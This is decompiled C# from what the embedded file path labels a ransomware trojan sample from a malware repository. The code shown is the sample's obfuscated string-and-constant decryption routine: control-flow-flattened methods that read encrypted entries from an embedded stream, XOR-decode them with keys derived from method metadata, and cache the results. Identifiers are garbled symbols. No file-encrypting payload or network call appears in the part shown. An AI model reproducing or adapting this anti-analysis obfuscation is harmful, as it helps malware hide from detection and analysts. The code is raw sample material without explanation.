// Decompiled with JetBrains decompiler
// Type: P���><`F�N>��(��
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79CC5886-3FF3-4BA2-A3E6-9E50089A921D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-5a26181f2f36991d9055db38b70c0df2d166b99d1714fb7a14978e2e0420b71d.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class P\uFFFD\uFFFD\uFFFD\u003E\u003C`F\uFFFDN\u003E\uFFFD\uFFFD\u0028\uFFFD\uFFFD
{
  static object \u0017\uFFFD\u0020\uFFFDI\u0002i\uFFFDM\u003C\uFFFD\u001B\uFFFDm\uFFFD\uFFFD(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = 2 - ~~-3;
    uint num3;
    object obj;
    Stream 밬뻫曆轠閼೮;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        switch (num2)
        {
          case 1:
            num5 ^= (uint) ((int) num6 * (int) num7 + 1) % 16U;
            num2 = -(-26 - (~8 + -6)) - 8;
            continue;
          case 2:
            num6 |= (uint) ((int) num8 + ~(int) num5 & 1931825864);
            goto case 12;
          case 3:
            num6 += (uint) (((int) num8 | (int) num5) ^ 1931825864);
            goto case 12;
          case 4:
            num8 ^= (uint) (((int) num6 & 16711935) << 8 ^ ((int) ((num6 & 16776960U) >> 8) | ~(int) num6 & (int) ushort.MaxValue));
            num2 = ~(-6 - --2) + 8;
            continue;
          case 5:
            num6 = 718337733U ^ num1;
            num8 = 1393365738U;
            num2 = ~(6 - 13 - 5);
            continue;
          case 6:
            if (num4 >= 0U)
            {
              int num10 = (int) num4;
              num2 = -(8 + 9 - ~-31);
              if ((uint) num10 < 16U)
              {
                num2 = ~~(3 + 5);
                continue;
              }
              continue;
            }
            goto case 13;
          case 7:
            num5 += (num6 ^ num7 - 1U) % num4;
            num2 = ~(-18 - -8);
            continue;
          case 8:
            num8 |= (uint) ((int) ((num6 & 65280U) >> 8) & (int) ((num6 & 16711680U) >> 16) ^ ~(int) num6 & (int) byte.MaxValue);
            num2 = ---8 + 9;
            continue;
          case 9:
            num6 -= (uint) (~((int) num8 ^ (int) num5) + 1931825864);
            goto case 12;
          case 10:
            if (num4 < 48U)
            {
              num8 += (uint) (((int) num6 & (int) byte.MaxValue | (int) ((num6 & 16711680U) >> 16)) + (~(int) num6 & (int) byte.MaxValue));
              num5 -= (uint) ~((int) num6 + (int) num4) % 48U;
              num6 ^= num8 % num5 | 1931825864U;
              num2 = ~~2 - -10;
              continue;
            }
            goto label_23;
          case 11:
            num5 = 2126197687U;
            num7 = 1U;
            break;
          case 12:
label_15:
            ++num7;
            break;
          case 13:
            if (num4 >= 16U)
            {
              num9 = (int) num4;
              num2 = ~(-6 - (4 - 9));
              continue;
            }
            goto default;
          case 14:
            if (num4 >= 64U)
              goto case 12;
            else
              goto label_29;
          case 15:
            goto label_30;
          case 16:
            goto label_31;
          case 17:
            goto label_32;
          default:
            if (num4 >= 32U)
            {
              num2 = ~(~13 - (5 - 8));
              continue;
            }
            goto label_23;
        }
        if (num7 > 64U)
        {
          num3 = num6 ^ b;
          if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num3, out obj))
          {
            Monitor.Enter((object) (밬뻫曆轠閼೮ = \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮));
            goto label_33;
          }
          else
            goto label_46;
        }
        else
        {
          num6 = (uint) (((int) num6 & 16777215) << 8) | (num6 & 4278190080U) >> 24;
          num2 = -(-24 + 7);
          continue;
        }
label_23:
        if (num4 >= 48U)
          num2 = -(~3 - ~-11);
        else
          goto label_15;
      }
      while ((uint) num9 >= 32U);
      num2 = -(7 + 4 - 25 - ~9);
      continue;
label_29:
      num2 = 21 - ~~5;
      continue;
label_30:
      num5 += num6 * num7 % 32U;
      num2 = --(25 - (7 + 3 + (6 + 7)));
      continue;
label_31:
      num8 ^= (uint) (((int) ((num6 & 16711680U) >> 16) | ~((int) num6 & (int) byte.MaxValue)) * (~(int) num6 & 16711680));
      num2 = ~-~-9;
      continue;
label_32:
      num4 = (num6 & (uint) byte.MaxValue) % 64U;
      num2 = -(~7 - (7 - 9));
    }
label_33:
    byte num11;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
      binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
      switch (13 + ~(9 + 3))
      {
        default:
          num11 = binaryReader.ReadByte();
          bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
          break;
      }
    }
    finally
    {
      Monitor.Exit((object) 밬뻫曆轠閼೮);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876217 ^ currentMethod.MetadataToken);
    int num12 = -~--1;
    while (true)
    {
      uint num13;
      ushort num14;
      ushort num15;
      ushort num16;
      ushort num17;
      int index;
      int num18;
      do
      {
        switch (num12)
        {
          case 1:
            obj = (object) BitConverter.ToDouble(bytes, 0);
            num12 = -(-17 - (8 - (5 + 9)) + 4);
            continue;
          case 2:
            num13 = (uint) (((int) num3 + (int) num11) * 1494844765);
            num14 = (ushort) (num13 >> 16);
            num15 = (ushort) (num13 & (uint) ushort.MaxValue);
            num16 = num15;
            num12 = -~(7 - ~8 - 9);
            continue;
          case 3:
            if (index >= bytes.Length)
            {
              num18 = (int) num11;
              num12 = -~(2 + (8 + 2 + ~3));
              continue;
            }
            goto case 12;
          case 4:
            obj = (object) Encoding.UTF8.GetString(bytes);
            num12 = ~-14 - 6;
            continue;
          case 5:
          case 7:
            \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num3] = obj;
            goto label_46;
          case 6:
label_43:
            int num19 = (int) num11;
            num12 = -(~-3 - -1 + ~9);
            if (num19 == 27)
            {
              num12 = 14 + ~(2 + 7);
              continue;
            }
            continue;
          case 8:
            num17 = num14;
            num12 = ~-(17 - -~5);
            continue;
          case 9:
            int num20 = (int) num11;
            num12 = -(~8 + (4 + 4) - 4 - (2 + 4));
            if (num20 == 117)
            {
              num12 = ~~(-(6 - 9) - 3);
              continue;
            }
            continue;
          case 10:
            index = 0;
            num12 = ~~~-4;
            continue;
          case 11:
            switch (num11)
            {
              case 11:
                obj = (object) BitConverter.ToInt32(bytes, 0);
                num12 = 9 - --4;
                continue;
              case 50:
                obj = (object) BitConverter.ToInt64(bytes, 0);
                num12 = ~~--7;
                continue;
              default:
                goto label_43;
            }
          case 12:
            bytes[index] ^= (byte) ((num13 * (uint) num16 + (uint) num17) % 256U ^ (uint) numArray[index % 8]);
            num16 = (ushort) ((num13 * (uint) num16 + (uint) num14) % 65536U);
            num17 = (ushort) ((num13 * (uint) num17 + (uint) num15) % 65536U);
            ++index;
            goto case 3;
          default:
            obj = (object) BitConverter.ToSingle(bytes, 0);
            num12 = 7 - (-2 + (8 - 6));
            continue;
        }
      }
      while (num18 != 152);
      num12 = ~(-3 - (8 - (3 + 8))) + 2;
    }
label_46:
    return obj;
  }

  static object \u0028\u007FصT\uFFFDą\u001F散\u0013\uFFFD\u000F\u0024(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = 462022342U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    uint num2 = 1137453962;
    int num3 = 5 + -~9 + ~3;
    uint num4;
    while (true)
    {
      uint num5;
      uint num6;
      int num7;
      do
      {
        uint num8;
        int num9;
        do
        {
          int num10;
          do
          {
            switch (num3)
            {
              case 1:
                if (num8 < 32U)
                  break;
                goto label_6;
              case 2:
                goto label_8;
              case 3:
                if (num8 < 0U || num8 >= 16U)
                {
                  if (num8 < 16U)
                    goto case 1;
                  else
                    goto label_24;
                }
                else
                  goto label_10;
              case 4:
                goto label_11;
              case 5:
                goto label_12;
              case 6:
                goto label_13;
              case 7:
                goto label_14;
              case 8:
                goto label_15;
              case 9:
                goto label_16;
              case 10:
                goto label_17;
              case 11:
                goto label_18;
              case 12:
                goto label_19;
              case 13:
                goto label_20;
              case 14:
                goto label_21;
              case 15:
                goto label_22;
              case 16:
              case 19:
                goto label_29;
              case 17:
                goto label_26;
              case 18:
                goto label_28;
              case 20:
                goto label_30;
              case 21:
                goto label_32;
              case 22:
                goto label_33;
            }
            if (num8 >= 48U)
            {
              num10 = (int) num8;
              num3 = ~8 - -28;
            }
            else
              goto label_29;
          }
          while ((uint) num10 >= 64U);
          num3 = ~~--9;
          continue;
label_6:
          num9 = (int) num8;
          num3 = 3 - ~-4;
        }
        while ((uint) num9 >= 48U);
        num3 = 19 + ~~3 + ~9 - 2;
        continue;
label_8:
        num1 = (uint) (((int) num1 & 16777215) << 8) | (num1 & 4278190080U) >> 24;
        num3 = ~~(5 + -~2);
        continue;
label_10:
        num3 = -~~-7;
        continue;
label_11:
        num1 |= (uint) ((int) num2 + ~(int) num5 & 1648906969);
        num3 = -(-23 - -(8 + 8) - 6);
        continue;
label_12:
        num3 = --20 + -3;
        continue;
label_13:
        num5 += num1 * num6 % 32U;
        num3 = -~-6 + 9;
        continue;
label_14:
        num2 |= (uint) ((int) ((num1 & 65280U) >> 8) & (int) ((num1 & 16711680U) >> 16) ^ ~(int) num1 & (int) byte.MaxValue);
        num3 = -(5 - 2 - --25);
        continue;
label_15:
        num8 = (num1 & (uint) byte.MaxValue) % 64U;
        num3 = ~(~0 - 3);
        continue;
label_16:
        num2 ^= (uint) (((int) ((num1 & 16711680U) >> 16) | ~((int) num1 & (int) byte.MaxValue)) * (~(int) num1 & 16711680));
        num3 = -~--11;
        continue;
label_17:
        num2 += (uint) (((int) num1 & (int) byte.MaxValue | (int) ((num1 & 16711680U) >> 16)) + (~(int) num1 & (int) byte.MaxValue));
        num5 -= (uint) ~((int) num1 + (int) num8) % 48U;
        num3 = -8 - (--3 - 36) - 4;
        continue;
label_18:
        num5 = 40559240U;
        num6 = 1U;
        num3 = 6 - -(-1 - -(9 - 9));
        continue;
label_19:
        num5 += (num1 ^ num6 - 1U) % num8;
        num3 = -(~9 - --8);
        continue;
label_20:
        num3 = -~26 - 8;
        continue;
label_21:
        num1 += (uint) (((int) num2 | (int) num5) ^ 1648906969);
        num3 = ~~--16;
        continue;
label_22:
        num2 ^= (uint) (((int) num1 & 16711935) << 8 ^ ((int) ((num1 & 16776960U) >> 8) | ~(int) num1 & (int) ushort.MaxValue));
        num3 = --~-7;
        continue;
label_24:
        num7 = (int) num8;
        num3 = -(-9 + (7 + 9) - 14 - -6);
        continue;
label_26:
        if (num6 <= 64U)
          goto label_8;
        else
          goto label_27;
      }
      while ((uint) num7 >= 32U);
      num3 = 5 + 8 - -4 - 2;
      continue;
label_27:
      num4 = num1 ^ b;
      num3 = --(-~2 - -17);
      continue;
label_28:
      num1 -= (uint) (~((int) num2 ^ (int) num5) + 1648906969);
      num3 = ~(~27 - -8);
      continue;
label_29:
      ++num6;
      num3 = 24 - ~~7;
      continue;
label_32:
      num1 ^= num2 % num5 | 1648906969U;
      num3 = ~~21 - 2;
      continue;
label_33:
      num5 ^= (uint) ((int) num1 * (int) num6 + 1) % 16U;
      num3 = 8 + 6 - (8 - 8);
    }
label_30:
    object obj;
    if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num4, out obj))
    {
      byte num11;
      byte[] bytes;
      lock (\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
        int num12 = ~(6 + 9 + ~4 - 14) - 2;
        while (true)
        {
          switch (num12)
          {
            case 1:
              binaryReader.BaseStream.Seek((long) num4, SeekOrigin.Begin);
              num12 = -~(1 - 2);
              continue;
            case 2:
              goto label_39;
            default:
              num11 = binaryReader.ReadByte();
              bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
              num12 = -6 - (2 - 2 - 8);
              continue;
          }
        }
      }
label_39:
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876216 ^ currentMethod.MetadataToken);
      int num13 = -(~~3 - 16) + 3;
      while (true)
      {
        ushort num14;
        uint num15;
        ushort num16;
        ushort num17;
        int num18;
        do
        {
          ushort num19;
          int index;
          int num20;
          do
          {
            int num21;
            int length;
            do
            {
              switch (num13)
              {
                case 1:
                  obj = (object) BitConverter.ToDouble(bytes, 0);
                  num13 = -(-3 - 4) + 7;
                  continue;
                case 2:
                  num21 = index;
                  length = bytes.Length;
                  num13 = 4 + (-2 - ~9) + -9;
                  continue;
                case 3:
                  goto label_45;
                case 4:
                  goto label_46;
                case 5:
                  goto label_47;
                case 6:
                  goto label_49;
                case 7:
                  goto label_50;
                case 8:
                  goto label_51;
                case 9:
                  goto label_53;
                case 10:
                  goto label_55;
                case 11:
                  goto label_56;
                case 12:
                  goto label_58;
                case 13:
                  goto label_60;
                case 14:
                  goto label_61;
                case 15:
                  goto label_63;
                case 16:
                  goto label_64;
                default:
                  num19 = num14;
                  num13 = ~(-24 - ~(8 + 5) - ~4);
                  continue;
              }
            }
            while (num21 < length);
            num13 = --11 - 6;
            continue;
label_45:
            bytes[index] ^= (byte) ((num15 * (uint) num16 + (uint) num19) % 256U ^ (uint) numArray[index % 8]);
            num13 = ~(6 + 4 + 9 - 26) + 4;
            continue;
label_46:
            index = 0;
            num13 = 9 - ~~-6;
            continue;
label_47:
            num20 = (int) num11;
            num13 = 27 - (2 - 8 - ~8) - (2 + 8) - 6;
          }
          while (num20 != 152);
          num13 = ~-~-3;
          continue;
label_49:
          num13 = ~(-18 - -3);
          continue;
label_50:
          obj = (object) Encoding.UTF8.GetString(bytes);
          num13 = 2 + 6 - ~5;
          continue;
label_51:
          if (num11 == (byte) 117)
          {
            obj = (object) BitConverter.ToSingle(bytes, 0);
            num13 = ~~--6;
            continue;
          }
label_53:
          if (num11 == (byte) 11)
          {
            obj = (object) BitConverter.ToInt32(bytes, 0);
            num13 = 23 + -(6 + 4);
            continue;
          }
          goto label_56;
label_55:
          num16 = (ushort) ((num15 * (uint) num16 + (uint) num14) % 65536U);
          num19 = (ushort) ((num15 * (uint) num19 + (uint) num17) % 65536U);
          ++index;
          num13 = ~(~7 + 5);
          continue;
label_56:
          if (num11 == (byte) 50)
          {
            obj = (object) BitConverter.ToInt64(bytes, 0);
            num13 = -~--13;
            continue;
          }
label_58:
          num18 = (int) num11;
          num13 = ~(--5 - 22) - 2;
        }
        while (num18 != 27);
        num13 = ----7;
        continue;
label_60:
        num13 = -(2 + 5 + ~6 - 6 - 8);
        continue;
label_63:
        num13 = ~-(-2 - ~(8 - 4));
        continue;
label_64:
        num15 = (uint) (((int) num4 + (int) num11) * 1494844765);
        num14 = (ushort) (num15 >> 16);
        num17 = (ushort) (num15 & (uint) ushort.MaxValue);
        num16 = num17;
        num13 = ~(7 - 15) - 7;
      }
label_61:
      \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num4] = obj;
    }
    return obj;
  }

  static object \uFFFD\u003AN\u003DdTfK\uFFFD\u0029\uFFFD\uFFFD\uFFFD\uFFFD(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = 903630187U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    uint num2 = 1538678929;
    int num3 = -~(39 + ~(9 + 8));
    uint num4;
    object obj;
    Stream 밬뻫曆轠閼೮;
    while (true)
    {
      uint num5;
      int num6;
      do
      {
        uint num7;
        uint num8;
        int num9;
        do
        {
          int num10;
          do
          {
            switch (num3)
            {
              case 1:
                num8 = 1U;
                goto label_15;
              case 2:
                num2 |= (uint) ((int) ((num1 & 65280U) >> 8) & (int) ((num1 & 16711680U) >> 16) ^ ~(int) num1 & (int) byte.MaxValue);
                num3 = 13 + ~-9;
                continue;
              case 3:
                num5 += num1 * num8 % 32U;
                num3 = ~-15 + -8 + 5;
                continue;
              case 4:
                num1 ^= num2 % num5 | 986665398U;
                goto label_14;
              case 5:
                goto label_10;
              case 6:
                if (num7 >= 32U)
                  break;
                goto label_13;
              case 7:
                goto label_14;
              case 8:
                goto label_17;
              case 9:
                goto label_18;
              case 10:
                goto label_19;
              case 11:
                goto label_20;
              case 12:
                goto label_21;
              case 13:
                goto label_22;
              case 14:
                goto label_23;
              case 15:
                goto label_25;
              case 16:
                goto label_26;
              case 17:
                goto label_28;
              case 18:
                goto label_29;
              case 19:
                goto label_31;
              case 20:
                goto label_32;
              case 21:
                goto label_33;
              case 22:
                goto label_36;
            }
            if (num7 >= 32U && num7 < 48U)
            {
              num3 = ~(-17 - (9 - 5));
            }
            else
            {
              num10 = (int) num7;
              num3 = -(-4 - (2 + 7 + ~2)) - 3;
            }
          }
          while ((uint) num10 < 48U);
          num3 = ~~~-15;
          continue;
label_10:
          if (num7 < 16U)
          {
            num3 = ~~7 - 5;
            continue;
          }
          goto label_34;
label_13:
          num2 ^= (uint) (((int) num1 & 16711935) << 8 ^ ((int) ((num1 & 16776960U) >> 8) | ~(int) num1 & (int) ushort.MaxValue));
          num3 = -~-7 + 9;
          continue;
label_14:
          ++num8;
label_15:
          num9 = (int) num8;
          num3 = 1 - -(5 + 4);
          continue;
label_23:
          if (num7 >= 64U)
            goto label_14;
          else
            goto label_24;
label_33:
          num5 ^= (uint) ((int) num1 * (int) num8 + 1) % 16U;
          num1 += (uint) (((int) num2 | (int) num5) ^ 986665398);
          goto label_14;
        }
        while ((uint) num9 <= 64U);
        num3 = -(4 - 8 + ~2 - 11 - ~2);
        continue;
label_17:
        num5 -= (uint) ~((int) num1 + (int) num7) % 48U;
        num3 = 6 - -(9 - 8) - -6 - 9;
        continue;
label_18:
        num3 = --16 + ~8;
        continue;
label_19:
        num1 = (uint) (((int) num1 & 16777215) << 8) | (num1 & 4278190080U) >> 24;
        num3 = --25 - (6 - 2) - 8;
        continue;
label_20:
        num1 |= (uint) ((int) num2 + ~(int) num5 & 986665398);
        num3 = 5 - ~~-4;
        continue;
label_21:
        num1 -= (uint) (~((int) num2 ^ (int) num5) + 986665398);
        num3 = ~~(10 - ~(2 - 6));
        continue;
label_22:
        num7 = (num1 & (uint) byte.MaxValue) % 64U;
        num3 = -(-7 - (4 + 5));
        continue;
label_24:
        num2 ^= (uint) (((int) ((num1 & 16711680U) >> 16) | ~((int) num1 & (int) byte.MaxValue)) * (~(int) num1 & 16711680));
        num3 = 26 + (~4 - (2 - 9)) + ~2 - 8;
        continue;
label_25:
        num4 = num1 ^ b;
        num3 = ~-18 - -8 - 7;
        continue;
label_26:
        if (num7 >= 0U)
        {
          num3 = 8 - ~(-2 - -(7 - 9));
          continue;
        }
        goto label_34;
label_28:
        num5 += (num1 ^ num8 - 1U) % num7;
        num3 = ~(-20 - ~(8 + 4) - (2 + 4));
        continue;
label_29:
        if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num4, out obj))
        {
          num3 = -~26 - 8;
          continue;
        }
        goto label_46;
label_31:
        Monitor.Enter((object) (밬뻫曆轠閼೮ = \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮));
        goto label_37;
label_32:
        num2 += (uint) (((int) num1 & (int) byte.MaxValue | (int) ((num1 & 16711680U) >> 16)) + (~(int) num1 & (int) byte.MaxValue));
        num3 = -(~6 - --1);
        continue;
label_34:
        num6 = (int) num7;
        num3 = 9 - (--14 - (7 - 2));
      }
      while ((uint) num6 < 16U);
      num3 = ~8 - -18 - 3;
      continue;
label_36:
      num5 = 1298423700U;
      num3 = ~(~6 - -5);
    }
label_37:
    byte num11;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
      switch (~-6)
      {
        default:
          binaryReader.BaseStream.Seek((long) num4, SeekOrigin.Begin);
          num11 = binaryReader.ReadByte();
          bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
          break;
      }
    }
    finally
    {
      Monitor.Exit((object) 밬뻫曆轠閼೮);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876219 ^ currentMethod.MetadataToken);
    uint num12 = (uint) (((int) num4 + (int) num11) * 1494844765);
    ushort num13 = (ushort) (num12 >> 16);
    ushort num14 = (ushort) (num12 & (uint) ushort.MaxValue);
    ushort num15 = num14;
    ushort num16 = num13;
    int index = 0;
    int num17 = -~--6;
    while (true)
    {
      int num18;
      do
      {
        int num19;
        do
        {
          int num20;
          do
          {
            switch (num17)
            {
              case 1:
                goto label_44;
              case 2:
                goto label_45;
              case 3:
                goto label_47;
              case 4:
                goto label_48;
              case 5:
              case 7:
                if (index >= bytes.Length)
                {
                  switch (num11)
                  {
                    case 117:
                      goto label_56;
                    case 152:
                      goto label_52;
                  }
                }
                else
                  goto label_54;
                break;
              case 6:
                goto label_53;
              case 8:
                goto label_55;
              case 9:
                goto label_57;
              case 10:
                goto label_59;
            }
            num20 = (int) num11;
            num17 = 3 - -(7 + (9 + 9) - 24);
          }
          while (num20 != 11);
          num17 = 5 - 4 - ~1;
          continue;
label_44:
          obj = (object) Encoding.UTF8.GetString(bytes);
          num17 = ~(~9 - ~6);
          continue;
label_45:
          \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num4] = obj;
          goto label_46;
label_47:
          obj = (object) BitConverter.ToInt32(bytes, 0);
          num17 = -(-30 - -(5 + 7)) - 8;
          continue;
label_48:
          num19 = (int) num11;
          num17 = -(~9 - (5 - 6));
          continue;
label_55:
          obj = (object) BitConverter.ToDouble(bytes, 0);
          goto label_45;
        }
        while (num19 != 50);
        num17 = ~~(20 - (3 + (7 + 4)));
        continue;
label_52:
        num17 = 12 - (~2 + 7);
        continue;
label_53:
        obj = (object) BitConverter.ToInt64(bytes, 0);
        num17 = -~(-2 - -(7 - 4));
        continue;
label_54:
        bytes[index] ^= (byte) ((num12 * (uint) num15 + (uint) num16) % 256U ^ (uint) numArray[index % 8]);
        num15 = (ushort) ((num12 * (uint) num15 + (uint) num13) % 65536U);
        num16 = (ushort) ((num12 * (uint) num16 + (uint) num14) % 65536U);
        ++index;
        num17 = --3 - -2;
        continue;
label_56:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        num17 = ~-(13 + ~(5 + 4));
        continue;
label_57:
        num18 = (int) num11;
        num17 = -~~-2;
      }
      while (num18 != 27);
      num17 = 6 + 3 - (17 - --9);
      continue;
label_59:
      num17 = -~3 - 2;
    }
label_46:
    return obj;
  }
}
